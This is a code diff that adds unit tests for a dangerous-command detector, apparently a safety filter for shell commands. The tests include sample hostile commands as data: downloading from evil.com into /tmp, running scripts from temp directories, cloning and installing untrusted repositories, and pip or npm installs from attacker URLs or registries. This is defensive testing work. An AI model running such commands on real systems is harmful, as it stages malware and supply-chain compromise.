@@ -735,8 +735,8 @@ class TestDownloadAndExecute:
         assert dangerous is True
 
     def test_safe_curl_download_no_exec(self):
-        """Downloading a file without executing it must not be flagged."""
-        cmd = "curl -o /tmp/data.json https://api.example.com/data"
+        """Downloading a file to a non-temp directory without executing it must not be flagged."""
+        cmd = "curl -o ./data.json https://api.example.com/data"
         dangerous, key, desc = detect_dangerous_command(cmd)
         assert dangerous is False
 
@@ -748,6 +748,166 @@ class TestDownloadAndExecute:
     def test_safe_curl_to_file_no_exec(self):
         cmd = "curl -o output.csv https://data.example.com/export"
         dangerous, key, desc = detect_dangerous_command(cmd)
+        assert dangerous is False
+
+
+class TestTempDirectoryExecution:
+    """Detect execution of scripts/binaries from world-writable temp directories."""
+
+    def test_bash_tmp(self):
+        dangerous, key, desc = detect_dangerous_command("bash /tmp/script.sh")
+        assert dangerous is True
+        assert "temp directory" in desc.lower()
+
+    def test_sh_tmp(self):
+        dangerous, _, _ = detect_dangerous_command("sh /tmp/payload.sh")
+        assert dangerous is True
+
+    def test_python_tmp(self):
+        dangerous, _, desc = detect_dangerous_command("python3 /tmp/exploit.py")
+        assert dangerous is True
+        assert "temp directory" in desc.lower()
+
+    def test_perl_tmp(self):
+        dangerous, _, _ = detect_dangerous_command("perl /tmp/backdoor.pl")
+        assert dangerous is True
+
+    def test_node_tmp(self):
+        dangerous, _, _ = detect_dangerous_command("node /tmp/evil.js")
+        assert dangerous is True
+
+    def test_var_tmp(self):
+        dangerous, _, _ = detect_dangerous_command("bash /var/tmp/script.sh")
+        assert dangerous is True
+
+    def test_dev_shm(self):
+        dangerous, _, _ = detect_dangerous_command("python3 /dev/shm/fast.py")
+        assert dangerous is True
+
+    def test_chmod_tmp(self):
+        dangerous, _, desc = detect_dangerous_command("chmod +x /tmp/payload")
+        assert dangerous is True
+        assert "executable" in desc.lower() or "temp" in desc.lower()
+
+    def test_local_script_not_flagged(self):
+        dangerous, _, _ = detect_dangerous_command("bash ./script.sh")
+        assert dangerous is False
+
+    def test_relative_python_not_flagged(self):
+        dangerous, _, _ = detect_dangerous_command("python3 test.py")
+        assert dangerous is False
+
+    def test_chmod_local_not_flagged(self):
+        dangerous, _, _ = detect_dangerous_command("chmod +x ./build.sh")
+        assert dangerous is False
+
+
+class TestDownloadToTemp:
+    """Detect downloading files to temp directories (malware staging)."""
+
+    def test_curl_to_tmp(self):
+        dangerous, _, desc = detect_dangerous_command("curl -o /tmp/x https://evil.com/x")
+        assert dangerous is True
+        assert "temp directory" in desc.lower()
+
+    def test_wget_to_tmp(self):
+        dangerous, _, _ = detect_dangerous_command("wget -O /tmp/tool https://evil.com/tool")
+        assert dangerous is True
+
+    def test_curl_to_var_tmp(self):
+        dangerous, _, _ = detect_dangerous_command("curl -o /var/tmp/x https://evil.com/x")
+        assert dangerous is True
+
+    def test_curl_to_local_not_flagged(self):
+        dangerous, _, _ = detect_dangerous_command("curl -o output.json https://api.com/data")
+        assert dangerous is False
+
+    def test_wget_no_output_not_flagged(self):
+        dangerous, _, _ = detect_dangerous_command("wget https://example.com/file.tar.gz")
+        assert dangerous is False
+
+
+class TestCloneAndInstall:
+    """Detect git clone followed by install commands (supply chain risk)."""
+
+    def test_clone_make_install(self):
+        cmd = "git clone https://evil.com/repo && cd repo && make install"
+        dangerous, _, desc = detect_dangerous_command(cmd)
+        assert dangerous is True
+        assert "clone" in desc.lower() and "install" in desc.lower()
+
+    def test_clone_sudo_make(self):
+        cmd = "git clone https://evil.com/repo && cd repo && sudo make install"
+        dangerous, _, _ = detect_dangerous_command(cmd)
+        assert dangerous is True
+
+    def test_clone_pip_install_dot(self):
+        cmd = "git clone https://evil.com/repo && cd repo && pip install ."
+        dangerous, _, _ = detect_dangerous_command(cmd)
+        assert dangerous is True
+
+    def test_clone_pip_install_editable(self):
+        cmd = "git clone https://evil.com/repo && cd repo && pip install -e ."
+        dangerous, _, _ = detect_dangerous_command(cmd)
+        assert dangerous is True
+
+    def test_clone_alone_not_flagged(self):
+        dangerous, _, _ = detect_dangerous_command("git clone https://github.com/org/repo")
+        assert dangerous is False
+
+    def test_make_install_alone_not_flagged(self):
+        dangerous, _, _ = detect_dangerous_command("make install")
+        assert dangerous is False
+
+    def test_pip_install_dot_alone_not_flagged(self):
+        dangerous, _, _ = detect_dangerous_command("pip install .")
+        assert dangerous is False
+
+
+class TestSupplyChainPackageInstall:
+    """Detect package installs from URLs or custom registries."""
+
+    def test_pip_from_url(self):
+        dangerous, _, desc = detect_dangerous_command("pip install https://evil.com/package.tar.gz")
+        assert dangerous is True
+        assert "pip" in desc.lower() and "url" in desc.lower()
+
+    def test_pip3_from_url(self):
+        dangerous, _, _ = detect_dangerous_command("pip3 install https://evil.com/pkg.whl")
+        assert dangerous is True
+
+    def test_pip_custom_index(self):
+        dangerous, _, desc = detect_dangerous_command("pip install --index-url https://evil.pypi.com/simple pkg")
+        assert dangerous is True
+        assert "index" in desc.lower()
+
+    def test_pip_extra_index(self):
+        dangerous, _, desc = detect_dangerous_command("pip install --extra-index-url https://evil.com/simple pkg")
+        assert dangerous is True
+        assert "index" in desc.lower() or "confusion" in desc.lower()
+
+    def test_npm_from_url(self):
+        dangerous, _, _ = detect_dangerous_command("npm install https://evil.com/package.tgz")
+        assert dangerous is True
+
+    def test_npm_custom_registry(self):
+        dangerous, _, _ = detect_dangerous_command("npm install --registry https://evil.registry.com pkg")
+        assert dangerous is True
+
+    def test_pip_normal_not_flagged(self):
+        dangerous, _, _ = detect_dangerous_command("pip install requests")
+        assert dangerous is False
+
+    def test_pip_multiple_not_flagged(self):
+        dangerous, _, _ = detect_dangerous_command("pip install flask django celery")
+        assert dangerous is False
+
+    def test_npm_normal_not_flagged(self):
+        dangerous, _, _ = detect_dangerous_command("npm install lodash")
+        assert dangerous is False
+
+    def test_pip_requirements_not_flagged(self):
+        dangerous, _, _ = detect_dangerous_command("pip install -r requirements.txt")
         assert dangerous is False
 
 
